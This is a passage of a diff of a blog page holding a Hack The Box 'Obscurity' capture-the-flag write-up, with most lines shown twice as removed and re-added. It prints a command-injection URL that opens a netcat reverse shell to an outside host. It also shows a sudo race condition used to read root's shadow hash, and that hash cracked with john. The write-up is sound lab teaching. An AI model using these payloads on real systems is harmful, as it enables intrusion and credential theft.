-</code></pre></div><p>By doing some code-analysis, is possible to see that the function <code>serveDoc()</code> is vulnerable to a command injection in its line <code>exec(info.format(path)) # This is how you do string formatting, right?</code> this is because it&rsquo;s making use of <a href=https://docs.python.org/2.0/ref/exec.html>exec</a> which is not even being sanitized, so in other words&mldr;there is being used a function which executes stuff at OS level while not sanitized, so this is our RCE :)</p><p>Pst: The hyperlink against the doc of <code>exec</code> points to 2.0 because when I did this machine, python 2.x was still alive, and then I just went to read of exec on that version.</p><h2 id=rce>RCE</h2><p>Knowing that the webserver is vulnerable to a command injection, I started to do some trial/error in differents ways, after some time and a little POC I ended getting a reverse shell by executing:</p><pre><code class=language-console data-lang=console>http://10.10.10.168:8080/';os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f');'
-</code></pre><img src=https://ceso.github.io/images/htb/obscurity/1-rce.png class=center style=border-radius:8px><h2 id=user>user</h2><p>Once inside a reverse, I start doing some normal linux enumeration, after a few minutes I see there is a user called <code>robert</code> and I list the contents of it&rsquo;s home:</p><pre><code class=language-console data-lang=console>www-data@obscure:/home/robert$ ls -la /home/robert
+</code></pre></div><p>By doing some code-analysis, is possible to see that the function <code>serveDoc()</code> is vulnerable to a command injection in its line <code>exec(info.format(path)) # This is how you do string formatting, right?</code> this is because it&rsquo;s making use of <a href=https://docs.python.org/2.0/ref/exec.html>exec</a> which is not even being sanitized, so in other words&mldr;there is being used a function which executes stuff at OS level while not sanitized, so this is our RCE :)</p>
+<p>Pst: The hyperlink against the doc of <code>exec</code> points to 2.0 because when I did this machine, python 2.x was still alive, and then I just went to read of exec on that version.</p>
+<h2 id=rce>RCE</h2>
+<p>Knowing that the webserver is vulnerable to a command injection, I started to do some trial/error in differents ways, after some time and a little POC I ended getting a reverse shell by executing:</p>
+<pre><code class=language-console data-lang=console>http://10.10.10.168:8080/';os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f');'
+</code></pre>
+<img src=https://ceso.github.io/images/htb/obscurity/1-rce.png class=center style=border-radius:8px>
+<h2 id=user>user</h2>
+<p>Once inside a reverse, I start doing some normal linux enumeration, after a few minutes I see there is a user called <code>robert</code> and I list the contents of it&rsquo;s home:</p>
+<pre><code class=language-console data-lang=console>www-data@obscure:/home/robert$ ls -la /home/robert
 total 60
 drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 .
 drwxr-xr-x 3 root   root   4096 Sep 24 22:09 ..
@@ -345,17 +462,23 @@ drwxrwxr-x 3 robert robert 4096 Oct  3 16:34 .local
 -rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
 -rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py
 -rwx------ 1 robert robert   33 Sep 25 14:12 user.txt
-</code></pre><p>So, we need to compromise <code>robert</code> and in it&rsquo;s home lies the path&mldr;in the ls is possible to see some interesting files/directorys: <code>BetterSSH</code>, <code>SuperSecureCrypt.py</code>, <code>out.txt</code>, <code>check.txt</code> and <code>passwordreminder.txt</code>, we start by checking the content of everything:</p><p>First, the directory BetterSSH looks interesting, but we can&rsquo;t see what&rsquo;s inside, so let&rsquo;s take note of this as might come handy later.</p><p><code>check.txt</code> has an interesting message:</p><pre><code class=language-console data-lang=console>www-data@obscure:/home/robert$ cat check.txt
+</code></pre><p>So, we need to compromise <code>robert</code> and in it&rsquo;s home lies the path&mldr;in the ls is possible to see some interesting files/directorys: <code>BetterSSH</code>, <code>SuperSecureCrypt.py</code>, <code>out.txt</code>, <code>check.txt</code> and <code>passwordreminder.txt</code>, we start by checking the content of everything:</p>
+<p>First, the directory BetterSSH looks interesting, but we can&rsquo;t see what&rsquo;s inside, so let&rsquo;s take note of this as might come handy later.</p>
+<p><code>check.txt</code> has an interesting message:</p>
+<pre><code class=language-console data-lang=console>www-data@obscure:/home/robert$ cat check.txt
 Encrypting this file with your key should result in out.txt, make sure your key is correct! 
-</code></pre><p><code>out.txt</code> looks like a ciphered message&mldr;(and from the content of <code>check.txt</code> we know they are related)</p><pre><code class=language-console data-lang=console>www-data@obscure:/home/robert$ file out.txt
+</code></pre><p><code>out.txt</code> looks like a ciphered message&mldr;(and from the content of <code>check.txt</code> we know they are related)</p>
+<pre><code class=language-console data-lang=console>www-data@obscure:/home/robert$ file out.txt
 out.txt: UTF-8 Unicode text, with NEL line terminators
 www-data@obscure:/home/robert$ cat out.txt
 ¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
-</code></pre><p>Same with <code>passwordreminder.txt</code>:</p><pre><code class=language-console data-lang=console>www-data@obscure:/home/robert$ file passwordreminder.txt
+</code></pre><p>Same with <code>passwordreminder.txt</code>:</p>
+<pre><code class=language-console data-lang=console>www-data@obscure:/home/robert$ file passwordreminder.txt
 passwordreminder.txt: UTF-8 Unicode text, with no line terminators
 www-data@obscure:/home/robert$ cat passwordreminder.txt 
 ´ÑÈÌÉàÙÁÑé¯·¿k
-</code></pre><p>And finally, the code of <code>SuperSecureCrypt.py</code>:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> sys
+</code></pre><p>And finally, the code of <code>SuperSecureCrypt.py</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> sys
 <span style=color:#f92672>import</span> argparse
 
 <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encrypt</span>(text, key):
@@ -390,19 +513,19 @@ parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&
                     metavar<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;InFile&#39;</span>,
                     type<span style=color:#f92672>=</span>str,
                     help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;The file to read&#39;</span>,
-                    required<span style=color:#f92672>=</span>False)
+                    required<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
 
 parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-o&#39;</span>,
                     metavar<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;OutFile&#39;</span>,
                     type<span style=color:#f92672>=</span>str,
                     help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Where to output the encrypted/decrypted file&#39;</span>,
-                    required<span style=color:#f92672>=</span>False)
+                    required<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
 
 parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-k&#39;</span>,
                     metavar<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Key&#39;</span>,
                     type<span style=color:#f92672>=</span>str,
                     help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Key to use&#39;</span>,
-                    required<span style=color:#f92672>=</span>False)
+                    required<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
 
 parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-d&#39;</span>, action<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;store_true&#39;</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Decrypt mode&#39;</span>)
 
@@ -415,34 +538,35 @@ banner<span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;#######
 banner <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;  ############################</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
 banner <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;  #        FILE MODE         #</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
 banner <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;  ############################&#34;</span>
-<span style=color:#66d9ef>print</span>(banner)
-<span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>o <span style=color:#f92672>==</span> None <span style=color:#f92672>or</span> args<span style=color:#f92672>.</span>k <span style=color:#f92672>==</span> None <span style=color:#f92672>or</span> args<span style=color:#f92672>.</span>i <span style=color:#f92672>==</span> None:
-    <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Missing args&#34;</span>)
+print(banner)
+<span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>o <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span> <span style=color:#f92672>or</span> args<span style=color:#f92672>.</span>k <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span> <span style=color:#f92672>or</span> args<span style=color:#f92672>.</span>i <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>:
+    print(<span style=color:#e6db74>&#34;Missing args&#34;</span>)
 <span style=color:#66d9ef>else</span>:
     <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>d:
-        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Opening file {0}...&#34;</span><span style=color:#f92672>.</span>format(args<span style=color:#f92672>.</span>i))
+        print(<span style=color:#e6db74>&#34;Opening file </span><span style=color:#e6db74>{0}</span><span style=color:#e6db74>...&#34;</span><span style=color:#f92672>.</span>format(args<span style=color:#f92672>.</span>i))
         <span style=color:#66d9ef>with</span> open(args<span style=color:#f92672>.</span>i, <span style=color:#e6db74>&#39;r&#39;</span>, encoding<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;UTF-8&#39;</span>) <span style=color:#66d9ef>as</span> f:
             data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
 
-        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Decrypting...&#34;</span>)
+        print(<span style=color:#e6db74>&#34;Decrypting...&#34;</span>)
         decrypted <span style=color:#f92672>=</span> decrypt(data, args<span style=color:#f92672>.</span>k)
 
-        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Writing to {0}...&#34;</span><span style=color:#f92672>.</span>format(args<span style=color:#f92672>.</span>o))
+        print(<span style=color:#e6db74>&#34;Writing to </span><span style=color:#e6db74>{0}</span><span style=color:#e6db74>...&#34;</span><span style=color:#f92672>.</span>format(args<span style=color:#f92672>.</span>o))
         <span style=color:#66d9ef>with</span> open(args<span style=color:#f92672>.</span>o, <span style=color:#e6db74>&#39;w&#39;</span>, encoding<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;UTF-8&#39;</span>) <span style=color:#66d9ef>as</span> f:
             f<span style=color:#f92672>.</span>write(decrypted)
     <span style=color:#66d9ef>else</span>:
-        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Opening file {0}...&#34;</span><span style=color:#f92672>.</span>format(args<span style=color:#f92672>.</span>i))
+        print(<span style=color:#e6db74>&#34;Opening file </span><span style=color:#e6db74>{0}</span><span style=color:#e6db74>...&#34;</span><span style=color:#f92672>.</span>format(args<span style=color:#f92672>.</span>i))
         <span style=color:#66d9ef>with</span> open(args<span style=color:#f92672>.</span>i, <span style=color:#e6db74>&#39;r&#39;</span>, encoding<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;UTF-8&#39;</span>) <span style=color:#66d9ef>as</span> f:
             data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
 
-        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Encrypting...&#34;</span>)
+        print(<span style=color:#e6db74>&#34;Encrypting...&#34;</span>)
         encrypted <span style=color:#f92672>=</span> encrypt(data, args<span style=color:#f92672>.</span>k)
 
-        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Writing to {0}...&#34;</span><span style=color:#f92672>.</span>format(args<span style=color:#f92672>.</span>o))
+        print(<span style=color:#e6db74>&#34;Writing to </span><span style=color:#e6db74>{0}</span><span style=color:#e6db74>...&#34;</span><span style=color:#f92672>.</span>format(args<span style=color:#f92672>.</span>o))
         <span style=color:#66d9ef>with</span> open(args<span style=color:#f92672>.</span>o, <span style=color:#e6db74>&#39;w&#39;</span>, encoding<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;UTF-8&#39;</span>) <span style=color:#66d9ef>as</span> f:
             f<span style=color:#f92672>.</span>write(encrypted)
 </code></pre></div><p>By analyzing what the code does, one can see that it takes a file as input and a key and ciphers that file, is possible to observe as well we can provide a ciphered file and it&rsquo;s correspondant plain text file in decrypt mode as key, which will give back the key that was used&mldr;
-Then we proceed to execute the script with <code>out.txt</code> as input and <code>check.txt</code> as the key, saving the output (the key), under tmp as <code>foobar</code>:</p><pre><code class=language-console data-lang=console>www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -k &quot;$( cat check.txt )&quot; -o /tmp/foobar -d
+Then we proceed to execute the script with <code>out.txt</code> as input and <code>check.txt</code> as the key, saving the output (the key), under tmp as <code>foobar</code>:</p>
+<pre><code class=language-console data-lang=console>www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -k &quot;$( cat check.txt )&quot; -o /tmp/foobar -d
 ################################
 #           BEGINNING          #
 #    SUPER SECURE ENCRYPTOR    #
@@ -457,7 +581,8 @@ Writing to /tmp/foobar...
 www-data@obscure:/home/robert$ cat /tmp/foobar    
 cat /tmp/foobar
 alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai
-</code></pre><p>Now, we are able to decipher <code>passwordreminder.txt</code> providing the key we got before, getting then the content of <code>passwordreminder.txt</code> and highly likely the password of the user itself:</p><pre><code class=language-console data-lang=console>www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai' -o /tmp/pass -d
+</code></pre><p>Now, we are able to decipher <code>passwordreminder.txt</code> providing the key we got before, getting then the content of <code>passwordreminder.txt</code> and highly likely the password of the user itself:</p>
+<pre><code class=language-console data-lang=console>www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai' -o /tmp/pass -d
 ################################
 #           BEGINNING          #
 #    SUPER SECURE ENCRYPTOR    #
@@ -471,7 +596,8 @@ Writing to /tmp/pass...
 www-data@obscure:/home/robert$ cat /tmp/pass
 cat /tmp/pass
 SecThruObsFTW
-</code></pre><p>Now we try to do <code>su - robert</code> with the retrived password, and we are <code>robert</code> :)</p><pre><code class=language-console data-lang=console>www-data@obscure:/home/robert$ cat /tmp/pass
+</code></pre><p>Now we try to do <code>su - robert</code> with the retrived password, and we are <code>robert</code> :)</p>
+<pre><code class=language-console data-lang=console>www-data@obscure:/home/robert$ cat /tmp/pass
 cat /tmp/pass
 SecThruObsFTW
 www-data@obscure:/home/robert$ su - robert
@@ -479,12 +605,15 @@ su - robert
 Password: SecThruObsFTW
 
 robert@obscure:~$
-</code></pre><h2 id=root>root</h2><p>From here on, is recommended to connect as robert via ssh with the password we got before as we will have a fully TTY. Once in, as we are <code>robert</code>, it&rsquo;s possible for us to see what&rsquo;s inside <code>BetterSSH</code>:</p><pre><code class=language-console data-lang=console>$ ls -la BetterSSH
+</code></pre><h2 id=root>root</h2>
+<p>From here on, is recommended to connect as robert via ssh with the password we got before as we will have a fully TTY. Once in, as we are <code>robert</code>, it&rsquo;s possible for us to see what&rsquo;s inside <code>BetterSSH</code>:</p>
+<pre><code class=language-console data-lang=console>$ ls -la BetterSSH
 total 12
 drwxr-xr-x 2 root   root   4096 Dec  2 09:47 .
 drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 ..
 -rwxr-xr-x 1 root   root   1805 Oct  5 13:09 BetterSSH.py
-</code></pre><p>There is a script called <code>BetterSSH.py</code>, we check it&rsquo;s code which is:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> sys
+</code></pre><p>There is a script called <code>BetterSSH.py</code>, we check it&rsquo;s code which is:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> sys
 <span style=color:#f92672>import</span> random<span style=color:#f92672>,</span> string
 <span style=color:#f92672>import</span> os
 <span style=color:#f92672>import</span> time
@@ -500,16 +629,16 @@ session <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;user&
 
     <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;/etc/shadow&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
         data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()
-    data <span style=color:#f92672>=</span> [(p<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;:&#34;</span>) <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;$&#34;</span> <span style=color:#f92672>in</span> p <span style=color:#66d9ef>else</span> None) <span style=color:#66d9ef>for</span> p <span style=color:#f92672>in</span> data]
+    data <span style=color:#f92672>=</span> [(p<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;:&#34;</span>) <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;$&#34;</span> <span style=color:#f92672>in</span> p <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>None</span>) <span style=color:#66d9ef>for</span> p <span style=color:#f92672>in</span> data]
     passwords <span style=color:#f92672>=</span> []
     <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> data:
-        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> x <span style=color:#f92672>==</span> None:
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> x <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>:
             passwords<span style=color:#f92672>.</span>append(x)
 
     passwordFile <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>join([<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>join(p) <span style=color:#66d9ef>for</span> p <span style=color:#f92672>in</span> passwords]) 
     <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;/tmp/SSH/&#39;</span><span style=color:#f92672>+</span>path, <span style=color:#e6db74>&#39;w&#39;</span>) <span style=color:#66d9ef>as</span> f:
         f<span style=color:#f92672>.</span>write(passwordFile)
-    time<span style=color:#f92672>.</span>sleep(<span style=color:#f92672>.</span><span style=color:#ae81ff>1</span>)
+    time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>.1</span>)
     salt <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
     realPass <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
     <span style=color:#66d9ef>for</span> p <span style=color:#f92672>in</span> passwords:
@@ -518,7 +647,7 @@ session <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;user&
             <span style=color:#66d9ef>break</span>
 
     <span style=color:#66d9ef>if</span> salt <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;&#34;</span>:
-        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Invalid user&#34;</span>)
+        print(<span style=color:#e6db74>&#34;Invalid user&#34;</span>)
         os<span style=color:#f92672>.</span>remove(<span style=color:#e6db74>&#39;/tmp/SSH/&#39;</span><span style=color:#f92672>+</span>path)
         sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
     salt <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;$6$&#39;</span><span style=color:#f92672>+</span>salt<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;$&#39;</span>
@@ -527,10 +656,10 @@ session <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;user&
     hash <span style=color:#f92672>=</span> crypt<span style=color:#f92672>.</span>crypt(passW, salt)
 
     <span style=color:#66d9ef>if</span> hash <span style=color:#f92672>==</span> realPass:
-        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Authed!&#34;</span>)
+        print(<span style=color:#e6db74>&#34;Authed!&#34;</span>)
         session[<span style=color:#e6db74>&#39;authenticated&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
     <span style=color:#66d9ef>else</span>:
-        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Incorrect pass&#34;</span>)
+        print(<span style=color:#e6db74>&#34;Incorrect pass&#34;</span>)
         os<span style=color:#f92672>.</span>remove(<span style=color:#e6db74>&#39;/tmp/SSH/&#39;</span><span style=color:#f92672>+</span>path)
         sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
     os<span style=color:#f92672>.</span>remove(os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(<span style=color:#e6db74>&#39;/tmp/SSH/&#39;</span>,path))
@@ -539,33 +668,38 @@ session <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;user&
     sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
 
 <span style=color:#66d9ef>if</span> session[<span style=color:#e6db74>&#39;authenticated&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
-    <span style=color:#66d9ef>while</span> True:
+    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
         command <span style=color:#f92672>=</span> input(session[<span style=color:#e6db74>&#39;user&#39;</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;@Obscure$ &#34;</span>)
         cmd <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;sudo&#39;</span>, <span style=color:#e6db74>&#39;-u&#39;</span>,  session[<span style=color:#e6db74>&#39;user&#39;</span>]]
         cmd<span style=color:#f92672>.</span>extend(command<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34; &#34;</span>))
         proc <span style=color:#f92672>=</span> subprocess<span style=color:#f92672>.</span>Popen(cmd, stdout<span style=color:#f92672>=</span>subprocess<span style=color:#f92672>.</span>PIPE, stderr<span style=color:#f92672>=</span>subprocess<span style=color:#f92672>.</span>PIPE)
 
         o,e <span style=color:#f92672>=</span> proc<span style=color:#f92672>.</span>communicate()
-        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;Output: &#39;</span> <span style=color:#f92672>+</span> o<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ascii&#39;</span>))
-        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;Error: &#39;</span>  <span style=color:#f92672>+</span> e<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ascii&#39;</span>)) <span style=color:#66d9ef>if</span> len(e<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ascii&#39;</span>)) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;&#39;</span>)
-</code></pre></div><p>On top of this we see that we can run with sudo (tl;dr: as root user) the mentioned script:</p><pre><code class=language-console data-lang=console>robert@obscure:~/BetterSSH$ sudo -l
+        print(<span style=color:#e6db74>&#39;Output: &#39;</span> <span style=color:#f92672>+</span> o<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ascii&#39;</span>))
+        print(<span style=color:#e6db74>&#39;Error: &#39;</span>  <span style=color:#f92672>+</span> e<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ascii&#39;</span>)) <span style=color:#66d9ef>if</span> len(e<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ascii&#39;</span>)) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span> <span style=color:#66d9ef>else</span> print(<span style=color:#e6db74>&#39;&#39;</span>)
+</code></pre></div><p>On top of this we see that we can run with sudo (tl;dr: as root user) the mentioned script:</p>
+<pre><code class=language-console data-lang=console>robert@obscure:~/BetterSSH$ sudo -l
 Matching Defaults entries for robert on obscure:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User robert may run the following commands on obscure:
     (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-</code></pre><p>By analyzing the source code, we see that once you try to login with <code>BetterSSH</code>, there is a moment where <code>/etc/shadow</code> is open in read mode (posible due to execute <code>BetterSSH.py</code> with sudo!), and is written under <code>/tmp/SSH</code> on a file, later on the temporal <code>/etc/shadow</code> written in tmp will be deleted, this means here we have a race condition where at some moment if we try to read the contents of the temporal file generated we will be able to do it, said this, let&rsquo;s try it.</p><p>On one terminal, we execute <code>BetterSSH.py</code> with sudo:</p><pre><code class=language-console data-lang=console>robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+</code></pre><p>By analyzing the source code, we see that once you try to login with <code>BetterSSH</code>, there is a moment where <code>/etc/shadow</code> is open in read mode (posible due to execute <code>BetterSSH.py</code> with sudo!), and is written under <code>/tmp/SSH</code> on a file, later on the temporal <code>/etc/shadow</code> written in tmp will be deleted, this means here we have a race condition where at some moment if we try to read the contents of the temporal file generated we will be able to do it, said this, let&rsquo;s try it.</p>
+<p>On one terminal, we execute <code>BetterSSH.py</code> with sudo:</p>
+<pre><code class=language-console data-lang=console>robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 Enter username: root
 Enter password: foo
 Incorrect pass
-</code></pre><p>And in another term, we execute a while true loop, that will be doing cat on the files under <code>/tmp/SSH</code>, and at some moment we confim the race condition we previously thought of as we have the content of <code>/etc/shadow</code> for the user root (remember the script is run with sudo):</p><pre><code class=language-console data-lang=console>robert@obscure:/tmp/SSH$ while true; do cat *; done
+</code></pre><p>And in another term, we execute a while true loop, that will be doing cat on the files under <code>/tmp/SSH</code>, and at some moment we confim the race condition we previously thought of as we have the content of <code>/etc/shadow</code> for the user root (remember the script is run with sudo):</p>
+<pre><code class=language-console data-lang=console>robert@obscure:/tmp/SSH$ while true; do cat *; done
 root
 $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
 18226
 0
 99999
 7
-</code></pre><p>I grab that content of shadow and the one of <code>/etc/passwd</code>, run unshadow to generate a file compatible to john and crack it:</p><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# unshadow passwd.txt shadow.txt &gt; rootkey.txt
+</code></pre><p>I grab that content of shadow and the one of <code>/etc/passwd</code>, run unshadow to generate a file compatible to john and crack it:</p>
+<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# unshadow passwd.txt shadow.txt &gt; rootkey.txt
 root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# john --wordlist=/usr/share/wordlists/rockyou.txt rootkey.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
@@ -573,11 +707,51 @@ Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
 mercedes         (root)
 --- SNIP ---
 Session completed
-</code></pre><p>And there we have the password of root user; <code>mercedes</code> and we succesfully login as root with it :D</p><pre><code class=language-console data-lang=console>robert@obscure:~/BetterSSH$ su - root
+</code></pre><p>And there we have the password of root user; <code>mercedes</code> and we succesfully login as root with it :D</p>
+<pre><code class=language-console data-lang=console>robert@obscure:~/BetterSSH$ su - root
 Password:
 root@obscure:~# id
 uid=0(root) gid=0(root) groups=0(root)
-</code></pre><p>Well, this was a really fun machine, and one that teach me a lot (specifically talking python stuff), so well I hope I can give something yousefull to you with this write up, and thanks a lot for read until the end :)</p><p>I will try to be making some time to do write ups of some other machines, until next time!!</p></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button next"><a href=https://ceso.github.io/es/posts/2020/02/hack-the-box-ai/><span class=button__text>Hack The Box - AI</span>
-<span class=button__icon>→</span></a></span></div></div><script src=https://utteranc.es/client.js repo=ceso/blog-source issue-term=title label="comments :speech_balloon:" theme=github-dark crossorigin=anonymous async></script><script src=https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><a href=javascript: id=return-to-top><i class=icon-chevron-up></i></a><link href=//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css rel=stylesheet></div></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2020</span>
-<span></span><span><a href=https://ceso.github.io/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span>
